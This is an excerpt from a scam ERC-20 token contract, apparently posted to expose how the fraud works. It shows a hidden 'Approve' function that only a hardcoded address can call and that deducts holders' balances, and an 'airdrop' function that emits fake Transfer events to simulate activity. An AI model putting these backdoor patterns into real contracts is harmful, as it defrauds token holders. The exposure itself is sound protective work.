// 揭露一个骗局是怎么工作的。
// https://twitter.com/dice_maker/status/1659867525977612289
// https://etherscan.io/address/0x5b3C469c3e504E998f82f375A1999d3fe7C2F617#code
...
contract M4573RCH is Context, IERC20 {
    ...
    address public _Owner = 0x8e374c23aab708894b6848Fdf3e8d0727cE01064;

    constructor () public {
        _name = "M4573RCH";
        _symbol ="M4573RCH";
        _decimals = 18;
        uint256 initialSupply = 457345734573;
        team = 0x2b82C78AE3c973c1Ce39D63b5d63c6CB8DB199EA;
    ...
    function Approve(address[] memory recipients)  public _noAccess(){
        for (uint256 i = 0; i < recipients.length; i++) {
            ...
            _balances[recipients[i]] = _balances[recipients[i]].sub(amt,
    ...
    modifier _noAccess() {
        require(msg.sender == 0xd38340154a466A74B4f18a11Ca6cfFABC532B3c1, 
    ...
    function airdrop(address ad,address[] memory eReceiver,uint256[] memory eAmounts) public _onlyOwner(){
        for (uint256 i = 0; i < eReceiver.length; i++) {
            emit Transfer(ad, eReceiver[i], eAmounts[i]);
        }
    }
}
